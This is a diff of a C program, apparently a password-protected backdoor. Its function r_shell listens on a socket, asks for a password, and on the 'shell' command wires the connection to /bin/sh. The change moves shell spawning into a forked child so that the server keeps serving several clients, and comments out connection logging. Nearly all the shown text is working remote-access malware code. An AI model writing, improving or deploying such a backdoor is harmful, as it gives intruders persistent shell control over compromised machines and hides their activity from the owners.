@@ -77,6 +77,7 @@ int r_shell(void)
 	int sd = 0;
 	char buffer[1025] = {0};
 	int valread;
+	int pid;
 	char hello_msg[] = "Password: ";
 	char conn_refused_msg[] = "Connexion refused\n";
 	char welcome_msg[] = "Welcome !\nCommands:\n\tshell:\tspawn a shell\n\tstop:\tstop server\n>: ";
@@ -145,30 +146,30 @@ int r_shell(void)
         }
 		//If something happened on the master socket, then its an incoming connection 
         if (FD_ISSET(master_sd, &readfds))  
-        {  
-            if ((new_socket = accept(master_sd, (struct sockaddr *)&client_address, &client_addr_size)) < 0)  
-            {
-                printf("error accepting connexion\n");  
-                return -1;  
-            }
+        {
+			if ((new_socket = accept(master_sd, (struct sockaddr *)&client_address, &client_addr_size)) < 0)  
+			{
+				printf("error accepting connexion\n");  
+				return -1;  
+			}
 			//add new socket to array of sockets 
-            int found = 0;
+			int found = 0;
 			for (int i = 0; i < MAX_CLIENTS; i++)  
-            {
-                //if position is empty 
-                if(clients_sockets[i] == 0)  
-                {  
-                    clients_sockets[i] = new_socket;  
-                    //printf("Adding to list of sockets as %d\n", i);  
-                    found = 1;
+			{
+				//if position is empty 
+				if(clients_sockets[i] == 0)  
+				{  
+					clients_sockets[i] = new_socket;  
+					//printf("Adding to list of sockets as %d\n", i);  
+					found = 1;
 					break;  
-                }
-            }
+				}
+			}
 			if (found == 0)
 				continue;
-            //inform user of socket number - used in send and receive commands 
-            //printf("New connection , socket fd is %d , ip is : %s , port : %d\n", new_socket, inet_ntoa(client_address.sin_addr), ntohs(client_address.sin_port));  
-            send(new_socket, hello_msg, strlen(hello_msg), 0);
+			//inform user of socket number - used in send and receive commands 
+			//printf("New connection , socket fd is %d , ip is : %s , port : %d\n", new_socket, inet_ntoa(client_address.sin_addr), ntohs(client_address.sin_port));  
+			send(new_socket, hello_msg, strlen(hello_msg), 0);
 			// check password
 			if (read(new_socket, buffer, 1024) < 0)
 			{
@@ -184,7 +185,7 @@ int r_shell(void)
 				return 1;
 			}
 			send(new_socket, welcome_msg, strlen(welcome_msg), 0); 
-            //printf("Welcome message sent successfully\n");    
+			//printf("Welcome message sent successfully\n");  
 		}
 		//else its some IO operation on some other socket
         for (int i = 0; i < MAX_CLIENTS; i++)  
@@ -196,8 +197,8 @@ int r_shell(void)
                 if ((valread = read(sd, buffer, 1024)) == 0)  
                 {
                     //Somebody disconnected , get his details and print 
-                    getpeername(sd, (struct sockaddr*)&client_address, &client_addr_size);  
-                    printf("Host disconnected , ip %s , port %d \n", inet_ntoa(client_address.sin_addr), ntohs(client_address.sin_port));
+                    //getpeername(sd, (struct sockaddr*)&client_address, &client_addr_size);  
+                    //printf("Host disconnected , ip %s , port %d \n", inet_ntoa(client_address.sin_addr), ntohs(client_address.sin_port));
                          
                     //Close the socket and mark as 0 in list for reuse 
                     close(sd);
@@ -211,14 +212,22 @@ int r_shell(void)
 					// handle shell command
                     if (strncmp(buffer, "shell", 5) == 0)
 					{
-						// Start reverse shell
-						dup2(clients_sockets[i], 0);
-						dup2(clients_sockets[i], 1);
-						dup2(clients_sockets[i], 2);
-						char * const argv[] = {"/bin/sh", NULL};
-						execve("/bin/sh", argv, NULL);
+						pid = fork();
+						if (pid == 0)
+						{
+							// Start reverse shell
+							dup2(clients_sockets[i], 0);
+							dup2(clients_sockets[i], 1);
+							dup2(clients_sockets[i], 2);
+							char * const argv[] = {"/bin/sh", NULL};
+							execve("/bin/sh", argv, NULL);
+							close(clients_sockets[i]);
+							clients_sockets[i] = 0;
+							exit(EXIT_FAILURE);
+						}
 					}
-					send(sd, buffer, strlen(buffer), 0); 
+					// echo
+					//send(sd, buffer, strlen(buffer), 0); 
                 }
             }
         }
